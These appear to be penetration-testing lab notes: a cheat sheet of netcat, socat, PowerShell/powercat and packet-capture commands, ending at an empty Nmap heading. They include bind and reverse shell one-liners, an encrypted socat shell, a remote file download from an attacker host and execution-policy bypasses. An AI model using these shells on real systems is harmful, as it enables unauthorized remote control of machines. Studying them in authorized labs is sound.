# Netcat

## Overview

Replace hardcoded lab IPs with <kali IP> and <target IP>.

## Commands

Interact with a service:
    nc -nv <target IP> 110

Chat:
    Kali:    nc -nv <target IP> 4444
    Windows: nc.exe -lvnp 4444

File transfer:
    Windows: nc.exe -lvnp 4444 > file.exe
    Kali:    nc -nv <target IP> 4444 < /path/to/file.exe

Bind shell:
    Windows: nc.exe -lvnp 4444 -e cmd.exe
    Kali:    nc -nv <target IP> 4444

Reverse shell:
    Windows: nc.exe -lvnp 4444
    Kali:    nc -nv <target IP> 4444 -e /bin/bash

## Validation / False Positives

nc file transfers give no completion message — verify file size on the receiver.


# Socat

## Commands

Windows binary:
    https://github.com/tech128/socat-2.0.0-b8-windows

Interact:
    socat - TCP4:<target IP>:110

Chat:
    Kali:    socat TCP4-LISTEN:443 -
    Windows: socat.exe - TCP4:<kali IP>:443

File transfer:
    Kali:    socat TCP4-LISTEN:443,fork file:file.txt
    Windows: socat.exe TCP4:<kali IP>:443 file:received.txt,create

Reverse shell:
    Windows: socat.exe -d -d TCP4-LISTEN:443 -
    Kali:    socat TCP4:<target IP>:443 EXEC:/bin/bash

Encrypted bind shell:
    openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 365 -out bind_shell.crt
    cat bind_shell.key bind_shell.crt > bind_shell.pem
    socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash
    Windows: socat.exe - OPENSSL:<kali IP>:443,verify=0


# PowerShell and Powercat

## Commands

Execution policy (admin cmd):
    Set-ExecutionPolicy Unrestricted

File download:
    powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://<kali IP>/wget.exe','C:\Users\<user>\Desktop\wget.exe')"

Powercat — https://github.com/besimorhino/powercat
    powershell -nop -exec bypass
    Import-Module .\powercat.ps1
    powercat -c <kali IP> -p 443 -e cmd.exe
    powercat -l -p 443 -e cmd.exe

## Validation / False Positives

Defender often quarantines powercat — use only on authorized lab targets.


# Packet Capture

## Wireshark

Filter by subnet:
    net <CIDR>

Display filter example:
    tcp.port == 21

Right click packet > Follow > TCP Stream

## tcpdump

tcpdump -r capture.pcap
tcpdump -n src host <target IP> -r capture.pcap
tcpdump -n dst host <target IP> -r capture.pcap
tcpdump -n port <port> -r capture.pcap
tcpdump -nX -r capture.pcap
tcpdump -A -n 'tcp[13] = 24' -r capture.pcap

# Scanning

## iptables

iptables -I OUTPUT 1 -d <kali IP> -j ACCEPT
iptables -vn -L

## Nmap vuln scripts
